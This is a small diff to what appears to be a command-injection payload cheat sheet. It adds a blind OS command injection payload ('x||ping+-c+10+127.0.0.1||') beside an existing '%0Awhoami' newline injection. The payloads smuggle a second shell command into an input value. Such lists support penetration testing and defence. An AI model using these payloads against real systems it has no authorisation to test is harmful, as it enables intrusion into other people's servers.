@@ -18,6 +18,11 @@
 %0Awhoami
 ```
 
+## Blind OS Command Injection
+```
+x||ping+-c+10+127.0.0.1||
+```
+
 # Code Execution
 
 ## Payload
